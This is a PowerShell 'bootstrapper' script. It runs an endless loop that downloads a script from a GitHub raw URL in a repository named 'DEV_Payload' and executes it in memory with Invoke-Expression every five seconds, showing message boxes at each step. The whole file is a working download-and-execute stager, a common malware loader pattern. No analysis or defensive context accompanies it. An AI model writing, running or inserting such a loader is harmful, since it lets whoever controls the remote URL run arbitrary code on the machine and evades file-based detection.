Add-Type -AssemblyName PresentationFramework

while ($true) {
    # Show alert: Starting download
    [System.Windows.MessageBox]::Show("Bootstrapper: Downloading main watcher script...")

    # Create WebClient and set headers
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Bootstrapper")

    # URL of your main watcher script
    $scriptUrl = "https://raw.githubusercontent.com/Umair13303/DEV_Payload/main/GitHub_Script/PowerShell/UniversalPowerShell_Dynamic_15E1362D_E98B_4386_9CA9_DD52D7ECCEE7.ps1"

    # Download the main watcher dynamically
    $code = $wc.DownloadString($scriptUrl)

    # Show alert: Download complete
    [System.Windows.MessageBox]::Show("Bootstrapper: Download complete. Executing...")

    # Execute the watcher in memory
    Invoke-Expression $code

    # Show alert: Execution finished
    [System.Windows.MessageBox]::Show("Bootstrapper: Execution complete. Waiting 5 seconds...")

    # Wait before next loop
    Start-Sleep -Seconds 5
}
